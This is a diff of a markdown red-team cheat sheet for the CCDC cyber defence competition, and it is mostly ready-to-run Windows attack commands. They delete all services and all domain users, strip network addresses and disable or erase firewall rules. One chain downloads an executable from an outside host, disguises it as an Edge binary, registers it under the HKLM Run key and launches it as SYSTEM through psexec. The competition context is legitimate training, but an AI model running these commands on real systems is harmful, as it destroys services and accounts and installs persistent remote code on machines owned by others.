@@ -241,11 +241,10 @@ pagetitle: Red Teaming for CCDC
 - `misc::wp /file:{path}` to set the current PC's wallpaper
 - `sc.exe stop dns` to stop dns
   - `sc.exe delete dns` to delete it
-  - Delete all services lol: `powershell -c "Get-Service | ForEach-Object { sc.exe delete $_.Name }"`
+  - Delete all services lol: `powershell -c "Get-Service | ForEach-Object { sc.exe stop $_.Name; sc.exe delete $_.Name }"`
 - Delete IP on interface: `netsh interface ip delete address "Ethernet" addr={address}`
 - `powershell -c "Get-ADUser -Filter * | ForEach-Object { Remove-ADUser $_ -Confirm:$false }"` to delete domain users
-- Set all computers to same background:
-  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
+- Set all computers to same background: `Function Set-WallPaper($i){Add-Type '[DllImport("user32.dll",CharSet=CharSet.Unicode)]public static extern int SystemParametersInfo(int a,int b,string c,int d);' -Name U -Namespace W;[W.U]::SystemParametersInfo(20,0,$i,3)}; iwr https://pbs.twimg.com/profile_images/1308769664240160770/AfgzWVE7_400x400.jpg -o C:\ProgramData\joe.jpg; Set-WallPaper "C:\ProgramData\joe.jpg"`
 - Make mouse shake: [cold_hands.exe](https://khaelkugler.com/misc_scripts/cold_hands.exe)
   - Script to make it happen and add to HKLM -> Run
   - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "ChillyFingers" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe"; iwr https://download.sysinternals.com/files/PSTools.zip -o "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip"; Expand-Archive "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip" -d "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\"; 1..5 | ForEach-Object { & "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\psexec.exe" -i $_ -d -s "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe" -accepteula }`
@@ -256,8 +255,9 @@ pagetitle: Red Teaming for CCDC
 - Spawn message box on Windows:
   - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
 - Firewall stuff
+  - Simplewall hopper: `https://github.com/ECWRCCDC/swh/blob/main/Payload/source/swh.c`
   - Turn off firewall: `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`
-  - Reset firewall to default rules: `netsh advfirewall reset`
+  - Reset firewall to default rules (this can break stuff): `netsh advfirewall reset`
   - NUKE firewall (will prevent remote access): `Remove-NetFirewallRule -All` 
 
 ## Dealing with System Protections
